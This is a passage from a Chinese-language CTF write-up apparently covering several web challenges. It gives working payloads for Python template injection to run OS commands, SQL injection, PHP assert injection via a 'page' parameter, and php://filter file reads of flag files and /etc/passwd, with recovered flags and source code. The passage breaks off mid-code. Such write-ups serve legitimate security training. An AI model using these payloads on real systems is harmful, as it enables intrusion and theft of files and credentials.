function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)-<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_</span>);<br>&#125;<br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$miwen</span>));<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322222156165.png" alt="image-20240322222156165"></p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>如题 SSTI</p><p>访问网址，没东西</p><p>猜测路径是注入点</p><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code> 我们需要 os 模块，故寻找 <code>warnings.catch_warnings</code></p><p>在 [59] 位找到</p><p>构造 <code>&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></p><p><img src="/posts/df9d333d/image-20240322223326989.png" alt="image-20240322223326989"></p><p><img src="/posts/df9d333d/image-20240322223411592.png" alt="image-20240322223411592"></p><h2 id="inget"><a href="#inget" class="headerlink" title="inget"></a>inget</h2><p>没想到是 sql，一点回显没有</p><p><code>http://61.147.171.105:53357/?id=1&#39; or &#39;1&#39;=&#39;1</code> 即可</p><p><img src="/posts/df9d333d/image-20240322223801462.png" alt="image-20240322223801462"></p><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>点击发现 <code>?page</code> 参数，猜测目录穿越</p><p>发现屏蔽了 <code>.</code></p><p><img src="/posts/df9d333d/image-20240322224119673.png" alt="image-20240322224119673"></p><p>访问 <code>page=flag</code> 为空白页面</p><p>猜测应该有什么目录，使用 dirsearch</p><p>发现 <strong>git泄露</strong></p><p><img src="/posts/df9d333d/image-20240322224500652.png" alt="image-20240322224500652"></p><p>使用 <strong>githack</strong> 下载</p><p><img src="/posts/df9d333d/image-20240322224700471.png" alt="image-20240322224700471"></p><p>得到 index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code> 明显存在拼接漏洞</p><p>所以传入 <code>?page=&#39;.system(&#39;whoami&#39;).&#39;</code> 即可</p><p><img src="/posts/df9d333d/image-20240322225442600.png" alt="image-20240322225442600"></p><h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>输入 127.0.0.1 得到 ping 数据回显</p><p><img src="/posts/df9d333d/image-20240319210549168.png" alt="image-20240319210549168"></p><p>尝试管道符号截断发现有WAF</p><p>多次尝试无果，查询wp</p><p>发现</p><ul><li>Django使用的是gbk编码，超过%F7的编码不在gbk中有意义</li><li>当 <code>CURLOPT_SAFE_UPLOAD</code> 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。</li></ul><p>尝试复现</p><p>输入 <code>/index.php?url=%80</code> 得到报错</p><p>可得敏感信息</p><p><img src="/posts/df9d333d/image-20240319211814443.png" alt="image-20240319211814443"></p><p>再通过<code>@</code>拼接路径得到<code>@/opt/api/database.sqlite3</code></p><p>搜索关键词可得<img src="/posts/df9d333d/image-20240319211950188.png" alt="image-20240319211950188"></p><h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><p>文件上传</p><p><img src="/posts/df9d333d/image-20240319212937464.png" alt="image-20240319212937464"></p><p><code>file_get_contents($file2) === &quot;hello ctf&quot;</code> 可以使用 <code>php://input</code> 同时 post 数据绕过</p><p>直接 <code>include(flag.php)</code> 发现无flag回显，猜测在注释里</p><p>于是通过base64回显</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1YmUxM2IxOWNhNWRjODhkMTNiODA0ZjYyNWNjYzg1NH0=<br>&lt;?php<br>echo &quot;WRONG WAY!&quot;;<br>// $flag = cyberpeace&#123;5be13b19ca5dc88d13b804f625ccc854&#125;<br></code></pre></td></tr></table></figure><h2 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h2><p>同样文件上传</p><p>F12 得到注释的 php</p><p><img src="/posts/df9d333d/image-20240319213707783.png" alt="image-20240319213707783"></p><p>思路很清晰了，同样通过base64回显</p><p><code>php://filter/read=convert.base64-encode/resource=flag</code>拼接<code>.php</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2NmZTNkZDdiNDBmM2MzMmJlYjI3MjA1ZmYzMjM2NDJlfSI7DQo/Pg==<br>&lt;?php<br>$flag=&quot;cyberpeace&#123;cfe3dd7b40f3c32beb27205ff323642e&#125;&quot;;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>一个个点打开 <strong>设备维护中心</strong></p><p>发现 <code>index.php?page=</code> 接口</p><p>猜测路径穿越漏洞</p><p><code>index.php?page=/etc/passwd</code></p><p>得到</p><p><img src="/posts/df9d333d/image-20240319231504827.png" alt="image-20240319231504827"></p><p>尝试 <code>php://filter/read=convert.base64-encode/resource=index.php</code> 得到</p><details><summary>index.html</summary><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">error_reporting(0);</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">@session_start();</span><br><span class="hljs-meta">posix_setuid(1000);</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;renderer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;webkit&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>设备维护中心<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-nav&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-nav-item layui-this&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=index&quot;</span>&gt;</span>云平台设备维护中心<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-elem-field layui-field-title&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 30px;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>设备列表<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-hide&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/html&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;switchTpl&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-comment">&lt;!-- 这里的 checked 的状态只是演示 --&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d.id</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">lay-skin</span>=<span class="hljs-string">&quot;switch&quot;</span> <span class="hljs-attr">lay-text</span>=<span class="hljs-string">&quot;开|关&quot;</span> <span class="hljs-attr">lay-filter</span>=<span class="hljs-string">&quot;checkDemo&quot;</span> </span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">d.id</span>==<span class="hljs-number">1</span> <span class="hljs-number">0003</span> ? <span class="hljs-string">&#x27;checked&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;layui/layui.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    layui.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> table = layui.<span class="hljs-property">table</span>,</span><br><span class="language-javascript">            form = layui.<span class="hljs-property">form</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        table.<span class="hljs-title function_">render</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">elem</span>: <span class="hljs-string">&#x27;#test&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/somrthing.json&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">cellMinWidth</span>: <span class="hljs-number">80</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">cols</span>: [</span><br><span class="language-javascript">                [</span><br><span class="language-javascript">                    &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;numbers&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;checkbox&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;ID&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">unresize</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;设备名&#x27;</span>, <span class="hljs-attr">templet</span>: <span class="hljs-string">&#x27;#nameTpl&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;area&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;区域&#x27;</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;status&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;维护状态&#x27;</span>, <span class="hljs-attr">minWidth</span>: <span class="hljs-number">120</span>, <span class="hljs-attr">sort</span>: <span class="hljs-literal">true</span> &#125;,</span><br><span class="language-javascript">                     &#123; <span class="hljs-attr">field</span>: <span class="hljs-string">&#x27;check&#x27;</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;设备开关&#x27;</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">85</span>, <span class="hljs-attr">templet</span>: <span class="hljs-string">&#x27;#switchTpl&#x27;</span>, <span class="hljs-attr">unresize</span>: <span class="hljs-literal">true</span> &#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            ],</span><br><span class="language-javascript">            <span class="hljs-attr">page</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    layui.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;element&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> element = layui.<span class="hljs-property">element</span>; <span class="hljs-comment">//导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="language-javascript">        <span class="hljs-comment">//监听导航点击</span></span><br><span class="language-javascript">        element.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;nav(demo)&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">//console.log(elem)</span></span><br><span class="language-javascript">            layer.<span class="hljs-title function_">msg</span>(elem.<span class="hljs-title function_">text</span>());</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$page = $_GET[page];</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if (isset($page)) &#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if (ctype_alnum($page)) &#123;</span><br><span class="hljs-meta">?&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;</span><span class="hljs-meta">&lt;?php echo $page; die();?&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">&#125;else&#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">                if ($page === &#x27;index.php&#x27;) &#123;</span><br><span class="hljs-meta">                    die(&#x27;Ok&#x27;);</span><br><span class="hljs-meta">                &#125;</span><br><span class="hljs-meta">                    include($page);</span><br><span class="hljs-meta">                    die();</span><br><span class="hljs-meta">                ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">&#125;&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    $pattern = $_GET[pat];</span><br><span class="hljs-meta">    $replacement = $_GET[rep];</span><br><span class="hljs-meta">    $subject = $_GET[sub];</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="hljs-meta">        preg_replace($pattern, $replacement, $subject);</span><br><span class="hljs-meta">    &#125;else&#123;</span><br><span class="hljs-meta">        die();</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure></details><p>我们摘出关键信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) &#123;<br><span class="hljs-meta">?&gt;</span><br><br>    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;<br>        &lt;p <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">lead</span>&quot;&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">page</span>; <span class="hljs-title">die</span>();?&gt;&lt;/<span 